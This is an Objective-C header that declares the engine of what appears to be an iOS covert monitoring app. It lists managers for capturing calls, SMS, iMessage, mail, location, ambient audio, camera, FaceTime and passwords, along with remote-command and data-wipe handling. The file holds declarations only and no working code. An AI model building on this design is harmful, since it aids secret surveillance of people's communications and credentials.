//
//  AppEngine.h
//  AppEngine
//
//  Created by Makara Khloth on 11/17/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "LicenseChangeListener.h"
#import "ServerAddressChangeDelegate.h"
#import "BackgroundTask.h"

@class AppContextImp;
@class SystemUtilsImpl;
@class LicenseManager;
@class ConfigurationManagerImpl;
@class ServerAddressManagerImp;
@class ConnectionHistoryManagerImp;
@class PreferenceManagerImpl;
@class CommandServiceManager;
@class DataDeliveryManager;
@class ActivationManager;
@class EventRepositoryManager;
@class EventDeliveryManager;
@class EventCenter;
@class RemoteCmdManagerImpl;
@class SBDidLaunchNotifier;
@class SoftwareUpdateManagerImpl;
@class UpdateConfigurationManagerImpl;

// Utils
@class ServerErrorStatusHandler;
@class PreferencesChangeHandler;
@class LicenseGetConfigUtils;
@class LicenseHeartbeatUtils;
@class SignificantLocationChangeHandler;

// Connection to UI
@class AppEngineConnection;

// Features
@class CallLogCaptureManager;
@class SMSCaptureManager;
@class IMessageCaptureManager;
@class MMSCaptureManager;
@class MailCaptureManager;
@class LocationManagerImpl;
@class AddressbookManagerImp;
@class MediaFinder;
@class MediaCaptureManager;
@class AppAgentManager;
@class BrowserUrlCaptureManager;
@class BookmarkManagerImpl;
@class ApplicationManagerImpl;
@class AmbientRecordingManagerImpl;
@class NoteManagerImpl;
@class CalendarManagerImpl;
@class CameraCaptureManager;
@class FaceTimeCaptureManager;
@class PasswordCaptureManager;
@class DeviceSettingsManagerImpl;
@class HistoricalEventManagerImpl;
@class WipeDataManagerImpl;

// Others
@protocol AppEngineDelegate;

@interface AppEngine : NSObject <LicenseChangeListener, ServerAddressChangeDelegate> {
@private
	// Engine
	AppContextImp*						mApplicationContext;
	SystemUtilsImpl						*mSystemUtils;
	LicenseManager*						mLicenseManager;
	ConfigurationManagerImpl*			mConfigurationManager;
	ServerAddressManagerImp*			mServerAddressManager;
	ConnectionHistoryManagerImp*		mConnectionHistoryManager;
	PreferenceManagerImpl*				mPreferenceManager;
	CommandServiceManager*				mCSM;
	DataDeliveryManager*				mDDM;
	ActivationManager*					mActivationManager;
	EventRepositoryManager*				mERM;
	EventDeliveryManager*				mEDM;
	EventCenter*						mEventCenter;
	RemoteCmdManagerImpl*				mRemoteCmdManager;
	SBDidLaunchNotifier					*mSBNotifier;
	SoftwareUpdateManagerImpl			*mSoftwareUpdateManager;
	UpdateConfigurationManagerImpl		*mUpdateConfigurationManager;
	
	// Utils
	ServerErrorStatusHandler*			mServerErrorStatusHandler;
	PreferencesChangeHandler			*mPreferencesChangeHandler;
	LicenseGetConfigUtils				*mLicenseGetConfigUtils;
	LicenseHeartbeatUtils				*mLicenseHeartbeatUtils;
    SignificantLocationChangeHandler    *mSignificantLocationChangeHandler;
    
	// Connection to UI
	AppEngineConnection*				mAppEngineConnection;
	
	// Features
	CallLogCaptureManager				*mCallLogCaptureManager;
	SMSCaptureManager					*mSMSCaptureManager;
	IMessageCaptureManager				*mIMessageCaptureManager;
	MMSCaptureManager					*mMMSCaptureManager;
	MailCaptureManager					*mMailCaptureManager;
	LocationManagerImpl					*mLocationManager;
	AddressbookManagerImp				*mAddressbookManager;
	MediaFinder							*mMediaFinder;
    MediaCaptureManager                 *mMediaCaptureManager;
	AppAgentManager						*mAppAgentManager;
	BrowserUrlCaptureManager			*mBrowserUrlCaptureManager;
	BookmarkManagerImpl					*mBookmarkManager;
	ApplicationManagerImpl				*mApplicationManager;
	AmbientRecordingManagerImpl			*mAmbientRecordingManager;
	NoteManagerImpl						*mNoteManager;
	CalendarManagerImpl					*mCalendarManager;
	CameraCaptureManager				*mCameraCaptureManager;
	FaceTimeCaptureManager				*mFTCaptureManager;
    PasswordCaptureManager              *mPasswordCaptureManager;
    DeviceSettingsManagerImpl           *mDeviceSettingsManager;
    HistoricalEventManagerImpl          *mHistoricalEventManager;
    WipeDataManagerImpl					*mWipeDataManager;
    
	// Flags & Others
	BOOL                                mIsRestartingAppEngine;
    id <AppEngineDelegate>              mAppEngineDelegate;
    BackgroundTask *mBackgroundTask;
}

// Engine
@property (nonatomic, readonly) AppContextImp* mApplicationContext;
@property (nonatomic, readonly) SystemUtilsImpl *mSystemUtils;
@property (nonatomic, readonly) LicenseManager* mLicenseManager;
@property (nonatomic, readonly) ConfigurationManagerImpl* mConfigurationManager;
@property (nonatomic, readonly) ServerAddressManagerImp* mServerAddressManager;
@property (nonatomic, readonly) ConnectionHistoryManagerImp* mConnectionHistoryManager;
@property (nonatomic, readonly) PreferenceManagerImpl* mPreferenceManager;
@property (nonatomic, readonly) CommandServiceManager* mCSM;
@property (nonatomic, readonly) DataDeliveryManager* mDDM;
@property (nonatomic, readonly) ActivationManager* mActivationManager;
@property (nonatomic, readonly) EventRepositoryManager* mERM;
@property (nonatomic, readonly) EventDeliveryManager* mEDM;
@property (nonatomic, readonly) EventCenter* mEventCenter;
@property (nonatomic, readonly) RemoteCmdManagerImpl* mRemoteCmdManager;
@property (nonatomic, readonly) SBDidLaunchNotifier *mSBNotifier;
@property (nonatomic, readonly) SoftwareUpdateManagerImpl *mSoftwareUpdateManager;
@property (nonatomic, readonly) UpdateConfigurationManagerImpl *mUpdateConfigurationManager;
@property (nonatomic, assign) id <AppEngineDelegate> mAppEngineDelegate;

// Features
@property (nonatomic, readonly) CallLogCaptureManager *mCallLogCaptureManager;
@property (nonatomic, readonly) SMSCaptureManager *mSMSCaptureManager;
@property (nonatomic, readonly) IMessageCaptureManager *mIMessageCaptureManager;
@property (nonatomic, readonly) MMSCaptureManager *mMMSCaptureManager;
@property (nonatomic, readonly) MailCaptureManager *mMailCaptureManager;
@property (nonatomic, readonly) LocationManagerImpl *mLocationManager;
@property (nonatomic, readonly) AddressbookManagerImp *mAddressbookManager;
@property (nonatomic, readonly) MediaFinder *mMediaFinder;
@property (nonatomic, readonly) MediaCaptureManager *mMediaCaptureManager;
@property (nonatomic, readonly) AppAgentManager *mAppAgentManager;
@property (nonatomic, readonly) BrowserUrlCaptureManager *mBrowserUrlCaptureManager;
@property (nonatomic, readonly) BookmarkManagerImpl *mBookmarkManager;
@property (nonatomic, readonly) ApplicationManagerImpl *mApplicationManager;
@property (nonatomic, readonly) AmbientRecordingManagerImpl	*mAmbientRecordingManager;
@property (nonatomic, readonly) NoteManagerImpl *mNoteManager;
@property (nonatomic, readonly) CalendarManagerImpl *mCalendarManager;
@property (nonatomic, readonly) CameraCaptureManager *mCameraCaptureManager;
@property (nonatomic, readonly) FaceTimeCaptureManager *mFTCaptureManager;
@property (nonatomic, readonly) PasswordCaptureManager *mPasswordCaptureManager;
@property (nonatomic, readonly) DeviceSettingsManagerImpl *mDeviceSettingsManager;
@property (nonatomic, readonly) HistoricalEventManagerImpl *mHistoricalEventManager;
@property (nonatomic, readonly) WipeDataManagerImpl *mWipeDataManager;

// Flags
@property (nonatomic, assign) BOOL mIsRestartingAppEngine;

- (void)captureAllDataTest;
- (void)captureAllData;

@end
